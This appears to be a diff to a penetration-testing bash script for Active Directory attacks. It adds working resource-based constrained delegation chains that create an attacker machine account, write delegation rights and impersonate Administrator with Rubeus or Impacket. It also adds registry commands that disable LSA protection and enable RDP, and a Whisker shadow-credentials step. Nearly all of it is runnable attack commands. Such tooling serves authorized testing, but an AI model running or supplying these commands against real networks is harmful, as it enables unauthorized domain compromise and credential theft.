@@ -247,29 +247,97 @@ perform_gpo_abuse_linux() {
 
 perform_rbcd_linux() {
     if [[ -z "$controlled_computer_name" ]]; then
-        echo "Controlled computer must be set before running RBCD."
-        return 1
+        echo "Assuming you don't have a controlled computer name"
     fi
     if [[ -z "$controlled_computer_pass" ]]; then
-        echo "Controlled computer password must be set before running RBCD."
-        return 1
+        echo "Assuming you don't have a controlled computer password"
     fi
-    if [[ -z "$domain" ]] || [[ -z "$username" ]] ||  [[ -z "$password" ]]; then
+    if [[ -z "$domain" ]] || [[ -z "$username" ]]; then
         echo "Domain, username, password must be set before running RBCD."
         return 1
     fi
-    if [[ -z "$target_system" ]]; then
-        echo "Target system must be set before running RBCD."
+    if [[ -z "$password" ]] && [[ -z "$ntlm_hash" ]]; then
+        echo "Password or NTLM hash must be set before running RBCD."
+        return 1
+    fi
+    if [[ -z "$target_computer" ]]; then
+        echo "Target computer must be set before running RBCD."
         return 1
     fi
     if [[ -z "$dc_ip" ]]; then
         echo "DC IP address must be set before running RBCD."
         return 1
     fi
-    echo rbcd.py -delegate-to "$target_system" -dc-ip "$dc_ip" -action read "$domain/$username:$password"
+    local credentials="$domain/$username"
+    if [[ ! -z "$password" ]]; then
+        credentials="$credentials:'$password'"
+    elif [[ ! -z "$ntlm_hash" ]]; then
+        credentials="$credentials -hashes :$ntlm_hash"
+    fi
+    if [[ ! -z "$controlled_computer_name" ]] && [[ ! -z "$controlled_computer_pass" ]]; then
+        echo "Using controlled computer name: $controlled_computer_name"
+    else
+        controlled_computer_name='ATTACKERSYSTEM$'
+        controlled_computer_pass='Summer2018!'
+        addcomputer.py -computer-name "$controlled_computer_name" -computer-pass "$controlled_computer_pass" -dc-host $dc_ip -domain-netbios $domain $credentials
+    fi
+    if [[ -z "$msdsspn" ]]; then
+        #allows us to use psexec
+        msdsspn="cifs/$target_computer.$domain"
+    fi
+    rbcd.py -delegate-from "$controlled_computer_name" -delegate-to "$target_computer\$" -dc-ip "$dc_ip" -action 'write' $credentials
+    getST.py -spn "$msdsspn" -impersonate 'Administrator' -dc-ip "$dc_ip" "$domain/$controlled_computer_name:$controlled_computer_pass"
+    krb5="Administrator@$msdsspn@${domain^^}.ccache"
+    krb5=$(echo "$krb5" | sed 's/\//_/g')
+    export KRB5CCNAME="$krb5"
+    echo "KRB5CCNAME set to $KRB5CCNAME"
+    target_ip=$target_computer.$target_domain
 
-    rbcd.py -delegate-to "$target_system" -dc-ip "$dc_ip" -action read "$domain/$username:$password"
 }
+
+perform_rbcd_windows() {
+
+    download_powerview
+    download_rubeus
+    download_powermad
+    echo 'New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)'
+    echo '$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'
+    echo '$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" '
+    echo '$SDBytes = New-Object byte[] ($SD.BinaryLength)'
+    echo '$SD.GetBinaryForm($SDBytes, 0)'
+    if [[ -z $target_computer ]]; then
+        echo "Target computer must be set before running S4U2Self impersonation."
+        return 1
+    fi
+    echo "\$TargetComputer = \"$target_computer\""
+    echo "Get-DomainComputer \$TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=\$SDBytes}"
+    echo './Rubeus.exe hash /password:Summer2018!'
+    if [[ -z $target_rc4 ]]; then
+        echo "Target RC4 hash must be set before running S4U2Self impersonation."
+        return 1
+    fi
+    if [[ -z $target_username ]]; then
+        echo "Target user must be set before running S4U2Self impersonation."
+        return 1
+    fi
+    if [[ -z $target_domain ]]; then
+        echo "Target domain must be set before running S4U2Self impersonation."
+        return 1
+    fi
+    echo "./Rubeus.exe s4u /user:attackersystem$ /rc4:$target_rc4 /impersonateuser:$target_username /msdsspn:cifs/$target_computer.$target_domain /ptt /nowrap"
+    if [[ -f administrator.kirbi.base64 ]]; then
+        if [[ ! -f administrator.kirbi ]]; then
+            base64 -d administrator.kirbi.base64 > administrator.kirbi
+        fi
+        if [[ ! -f administrator.ccache ]]; then
+            ticketConverter.py administrator.kirbi administrator.ccache
+        fi
+    fi
+    export KRB5CCNAME="administrator.ccache"
+    target_ip=$target_computer.$target_domain
+
+}
+
 # WinRM runs on 5985 by default
 run_evil_winrm() {
     if [[ -z "$target_ip" ]]; then
@@ -390,9 +458,10 @@ get_ntdsutil_commands() {
 }
 
 enable_rdp_commands() {
-
-    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /d 0 /t REG_DWORD;'
-    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f;'
+    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /d 0 /t REG_DWORD'
+    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPLBoot /d 0 /t REG_DWORD'
+    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /d 0 /t REG_DWORD'
+    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
 }
 
 #change password using powerview
@@ -435,6 +504,16 @@ change_password_samba() {
 
 }
 
+perform_shadow_credentials_exe() {
+    echo "Performing shadow credentials..."
+    if [[ -z "$target_username" ]]; then
+        target_username="Administrator"
+        echo "No target username provided, using default $target_username"
+    fi
+    cp $SCRIPTDIR/../../tools/Whisker/Whisker-main/Whisker/bin/Release/Whisker.exe .
+    generate_windows_download Whisker.exe
+    echo ".\Whisker.exe add /target:$target_username"
+}
 #shadow credentials
 #ca/pki needs to be setup to do this
 
